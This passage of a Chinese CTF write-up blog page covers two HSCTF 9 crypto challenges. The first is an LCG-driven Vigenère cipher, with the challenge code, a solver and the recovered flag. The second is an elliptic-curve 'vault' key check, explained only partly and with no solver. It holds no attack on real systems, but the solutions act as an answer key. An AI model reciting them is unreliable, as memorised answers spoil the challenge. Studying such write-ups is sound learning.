+<h2 id="lcvc"><a href="#lcvc" class="headerlink" title="lcvc"></a>lcvc<a href="#lcvc" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">0</span>:<span class="number">5</span>]+flag[-<span class="number">1</span>]==<span class="string">&quot;flag&#123;&#125;&quot;</span>)</span><br><span class="line">ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> flag[<span class="number">5</span>:-<span class="number">1</span>]:</span><br><span class="line">    state = (<span class="number">15</span>*state+<span class="number">18</span>)%<span class="number">29</span></span><br><span class="line">    ciphertext+=alphabet[(alphabet.index(character)+state)%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="comment">#mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw</span></span><br></pre></td></tr></table></figure>
+<p>阅读一下题目源码，题目相当于一个移位密码，只不过每次的移位是不固定的，设第i轮的移位是$k<em>i$，则第i+1轮的移位$k</em>{i+1}=(15*k_i+18)%29$，由于$k_0=state$ 已知，所以我们可以轻松迭代出每一轮的移位。计算出每一轮的移位之后，用密文减去对应轮的移位即可恢复明文。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">state = <span class="number">1</span></span><br><span class="line">ciphertext = <span class="string">&quot;mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw&quot;</span></span><br><span class="line">length = <span class="built_in">len</span>(ciphertext)</span><br><span class="line">num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    state = (<span class="number">15</span>*state+<span class="number">18</span>)%<span class="number">29</span></span><br><span class="line">    num.append(state)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(num) == <span class="built_in">len</span>(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    flag += alphabet[(alphabet.index(ciphertext[i]) - num[i])%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher</span></span><br></pre></td></tr></table></figure>
+<h2 id="the-vault"><a href="#the-vault" class="headerlink" title="the-vault"></a>the-vault<a href="#the-vault" class="header-anchor">#</a></h2><p>最后一题是压轴，对我来说挺困难的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy </span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">admin = <span class="literal">False</span></span><br><span class="line">adminKey = (<span class="number">7024170033995563248669070948202275621832659349979887130360116095557494224289964760016097751188998415</span>, <span class="number">3170315055328760291009922771816122</span>, <span class="number">250376935805204674013389241468539348499776429965769848974957007209785494103442398289504600645160477724</span>, <span class="number">43395542902454917488842651277236247</span>)</span><br><span class="line">publicKey = <span class="number">51133059403872132269736212485462945485381032580683758205093039961914793947944949374017744787298892843604322756848647643991762827932760</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key==adminKey:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> admin:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Sorry, you must be an admin to use this key.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> sympy.sympify(sympy.sqrt(key[<span class="number">0</span>]*key[<span class="number">0</span>]*key[<span class="number">3</span>]*key[<span class="number">3</span>]+key[<span class="number">1</span>]*key[<span class="number">1</span>]*key[<span class="number">2</span>]*key[<span class="number">2</span>])).is_integer <span class="keyword">and</span> sympy.sympify(<span class="number">4</span>*key[<span class="number">0</span>]*key[<span class="number">2</span>])/(key[<span class="number">1</span>]*key[<span class="number">3</span>])==publicKey <span class="keyword">and</span> sympy.gcd(key[<span class="number">0</span>],key[<span class="number">1</span>])==<span class="number">1</span> <span class="keyword">and</span> sympy.gcd(key[<span class="number">2</span>],key[<span class="number">3</span>])==<span class="number">1</span> <span class="keyword">and</span> sympy.sympify(key[<span class="number">0</span>])/key[<span class="number">1</span>]&lt;sympy.sympify(key[<span class="number">2</span>])/key[<span class="number">3</span>] <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">0</span>]))&gt;<span class="number">3000</span><span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">1</span>]))&gt;<span class="number">3000</span><span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">2</span>]))&gt;<span class="number">3000</span><span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">3</span>]))&gt;<span class="number">3000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello! To open this vault, you must provide the correct password.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> verify((<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;First key: &quot;</span>)),<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Second key: &quot;</span>)),<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Third key: &quot;</span>)),<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Fourth key: &quot;</span>)))):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You&#x27;re in!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect. Better luck next time.&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://doc.sagemath.org/html/en/reference/arithmetic_curves/sage/schemes/elliptic_curves/constructor.html">Elliptic curve constructor — Elliptic curves (sagemath.org)</a></p>
+<p>题目的意思很简单，就是让我们输入4个数（4把密钥）然后通过验证即可拿到flag。<code>verify</code>函数的第一个if语句显然是不能用来解题的，于是我们的焦点来到了第二个if语句上。解题的关键就是找到满足第二个if语句的4个数。</p>
+<p>我们需要找到四个数$a,b,c,d&gt;10^{3000}$使得$(ad)^2+(bc)^2$是一个完全平方数，同时$4ac/(bd)=p$，$p$是代码中的publickey，同时我们还有条件$gcd(a,b)=gcd(c,d)=1,a/b&lt;c/d$</p>
+<p>这道题目其实是在有理数域内求解丢番图方程的解。</p>
+<p>经过一通操作可以变成求解$(p/8)Y^2=X^3-X$这个方程，其中两个解$X,Y$都是有理数。</p>
+<p>观察一下这个方程就会发现跟椭圆曲线很相似,利用sage的函数将其变成Weierstrass form形式。</p>
+<p><a target="_blank" rel="noopener" href="https://math.stackexchange.com/questions/880419/a-general-equation-for-pythagorean-triples-of-rational-numbers">https://math.stackexchange.com/questions/880419/a-general-equation-for-pythagorean-triples-of-rational-numbers</a></p>
+<h2 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h2><p><a target="_blank" rel="noopener" href="https://hackmd.io/@aplet123/r1TIzZbYq#vending-machine-v2">https://hackmd.io/@aplet123/r1TIzZbYq#vending-machine-v2</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.y011d4.com/20220611-hsctf-writeup#homophones">HSCTF 9 Writeup | y011d4.log</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s/hsctf-9-challenges">MirRoR4s/hsctf-9-challenges (github.com)</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/26/DownUnderCTF-2022/" rel="prev" title="DownUnderCTF_2022">
+      <i class="fa fa-chevron-left"></i> DownUnderCTF_2022
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#markdown-plus-plus-css-zhu-ru"><span class="nav-number">1.1.</span> <span class="nav-text">markdown-plus-plus-CSS注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#h3-png-wizard-os-ming-ling-zhu-ru"><span class="nav-number">1.2.</span> <span class="nav-text">h3 png-wizard-OS命令注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#png-wizard-v2-cve-2016-3717-du-qu-ren-yi-ben-di-wen-jian"><span class="nav-number">1.3.</span> <span class="nav-text">png-wizard-v2-cve-2016-3717-读取任意本地文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-baby-rsa"><span class="nav-number">3.</span> <span class="nav-text">baby-baby-rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-rsa"><span class="nav-number">4.</span> <span class="nav-text">baby-rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bucephala-albeola-the-second"><span class="nav-number">5.</span> <span class="nav-text">bucephala-albeola-the-second</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#homophones"><span class="nav-number">6.</span> <span class="nav-text">homophones</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#otp"><span class="nav-number">7.</span> <span class="nav-text">otp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lcvc"><span class="nav-number">8.</span> <span class="nav-text">lcvc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#the-vault"><span class="nav-number">9.</span> <span class="nav-text">the-vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#yin-yong"><span class="nav-number">10.</span> <span class="nav-text">引用</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">MirRoR4s</p>
+  <div class="site-description" itemprop="description">不能说的秘密</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">MirRoR4s</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
